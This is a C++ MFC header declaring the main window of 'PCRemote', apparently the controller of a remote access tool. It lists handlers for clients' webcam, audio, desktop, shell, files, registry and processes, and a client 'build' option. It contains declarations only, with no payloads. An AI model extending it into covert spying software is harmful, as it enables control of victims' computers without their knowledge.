
// PCRemoteDlg.h : 头文件
//

#pragma once
#include "afxcmn.h"
#include "TrueColorToolBar.h"
#include "include/IOCPServer.h"
#include "SEU_QQwry.h"
#include "SystemDlg.h"
// CPCRemoteDlg 对话框
class CPCRemoteDlg : public CDialogEx
{
// 构造
public:
	CPCRemoteDlg(CWnd* pParent = NULL);	// 标准构造函数

// 对话框数据
	enum { IDD = IDD_PCREMOTE_DIALOG };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持


// 实现
protected:
	HICON m_hIcon;
	CMenu m_MainMemu;				//主对话框上菜单
	CStatusBar m_StatusBar;			//状态栏
	int iCount;
	SEU_QQwry *m_QQwry;
	CTrueColorToolBar m_ToolBar;
	NOTIFYICONDATA nid;				//托盘
	BOOL bWindows;					//是否点击“窗口管理”工具栏。“窗口管理”和“进程管理”写在一个对话框里
	CSystemDlg *pWindlg;

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	CListCtrl m_CList_Online;
	CListCtrl m_CList_Message;
	afx_msg void OnSize(UINT nType, int cx, int cy);
	int InitList(void);
	// add to online list
	void AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, 
		CString strVideo, CString strPing, ClientContext *pContext);
	// show msg
	void ShowMessage(bool bIsOK, CString strMsg);
	//void test(void);
	afx_msg void OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnOnlineAudio();
	afx_msg void OnOnlineCmd();
	afx_msg void OnOnlineDesktop();
	afx_msg void OnOnlineFile();
	afx_msg void OnOnlineProcess();
	afx_msg void OnOnlineRegedit();
	afx_msg void OnOnlineServer();
	afx_msg void OnOnlineVideo();
	afx_msg void OnOnlineWindow();
	afx_msg void OnOnlineDelete();
	afx_msg void OnMainAbout();
	afx_msg void OnMainBuild();
	afx_msg void OnMainClose();
	afx_msg void OnMainSet();

	//自定义消息
	// create statusbar
	afx_msg LRESULT OnIconNotify(WPARAM wParam,LPARAM lParam);		//托盘callback
	afx_msg LRESULT OnAddToList(WPARAM wParam,LPARAM lParam);		//添加上线client信息到列表
	afx_msg LRESULT OnOpenShellDialog(WPARAM, LPARAM);					//打开终端命令对话框
	afx_msg LRESULT OnOpenSystemDialog(WPARAM wParam, LPARAM lParam);   //打开进程管理对话框
	afx_msg	LRESULT OnOpenScreenSpyDialog(WPARAM, LPARAM);				//打开远程桌面对话框
	afx_msg LRESULT OnOpenManagerDialog(WPARAM , LPARAM );				//打开文件管理对话框

	void CreateStatusBar(void);
	void CreateToolBar(void);
	afx_msg void OnNotifyClose();
	afx_msg void OnNotifyShow();
	afx_msg void OnClose();

protected:
	void Activate(UINT nPort, UINT nMaxConnections);
	static void CALLBACK NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode);
	static void ProcessReceiveComplete(ClientContext *pContext);
public:
	// 开始监听
	void ListenPort(void);
	CString GetOSDisplayString(OSVERSIONINFOEX& OsVerInfoEx);
private:
	void SendSelectCommand(PBYTE pData, UINT nSize);
};
